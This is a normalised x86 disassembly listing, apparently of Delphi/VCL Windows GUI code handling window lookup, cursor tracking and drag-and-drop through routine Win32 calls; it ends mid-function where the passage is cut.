mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_444ce8
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4045e0
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_443e30
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_444d48
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_444ce8
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_444d74
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_444ad4
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_444d48
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_444c90
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_44d7a4
mov [ esi ] eax
sub_444dc4
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_444c90
cmp eax 0x1
sbb eax eax
inc eax
sub_444e00
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_44c208
test eax eax
je r-xdata
mov eax esi
call sub_44c208
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_445830
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_41b654
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_41b6b0
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_44c21c
mov edi eax
jmp r-xdata
sub_444e94
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_444d74
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44f264
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_444dc4
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_444dc4
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_446ac8
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_444dc4
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464aa8
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_44f24c
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_444e00
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_40358c
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_44f34c
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_44f264
jmp r-xdata
mov eax [ rw-data ]
call sub_44f3c0
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464aa8
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_446ac8
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_40358c
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_40358c
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_4081b0
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_445164
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_444390
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44f264
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_444e94
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_4452d4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_445479
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_40358c
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_40358c
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_444698
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_445164
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_444580
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_44d7a4
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_419ff0
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_446a9c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_419ff0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_445498
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_40358c
mov ebx eax
sub_44550c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4457d8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_445766
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4443d8
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403540
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_445498
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_444dc4
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_44f3c0
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44576d
mov eax [ rw-data ]
call sub_403390
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_45dd9c
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_448138
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_444c90
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_461a08
sub_44576d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40351c
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403390
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_40351c
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
sub_4457fc
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_443e64
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_445830
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_4457fc
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_446ac8
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_44b058
test eax eax
je r-xdata
mov esi eax
sub_445878
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_41b4f8
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx ] eax
sub_4458a0
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_41b7f0
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403390
xor eax eax
mov [ ebx ] eax
sub_4458c0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4458f0
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_41ba18
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4459a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41ba7c
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_445979
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_445b2c
call sub_403c08
call sub_403c08
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41b654
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_427bec
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_4459ac
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_41ba18
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_445a4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445a51
mov eax [ rw-data ]
call sub_41ba7c
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_445a22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_445b2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_427c48
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41b654
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_427bec
test al al
je r-xdata
sub_445a58
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
call sub_445b2c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42781c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_445a84
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_427dcc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_427dd0
mov eax [ ebp - 0x4 ]
call sub_445b78
mov eax [ rw-data ]
call sub_41ba18
mov ebx eax
xor eax eax
push ebp
push sub_445b09
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41b4f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41ba7c
retn
call sub_4458f0
sub_445b2c
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_427dd0
mov edx ebx
mov eax [ rw-data ]
call sub_41ba2c
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_445b78
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4475c8
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_445ba4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403360
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_445be0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41bd34
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_445c28
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_445ce4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_445db1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445db8
lea eax [ ebp - 0x1c ]
call sub_404120
lea eax [ ebp - 0x8 ]
call sub_404120
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_40358c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_456470
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_4092d8
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_404174
sub_445dd4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_445e3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_45353c
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_446f84
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov edx [ eax + 0x64 ]
pop eax
call sub_40452c
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445e42
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov al 0x1
sub_445e48
push ebx
mov ebx eax
mov eax ebx
call sub_453564
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_445e7c
push ebx
mov ebx eax
mov eax ebx
call sub_4535b4
test al al
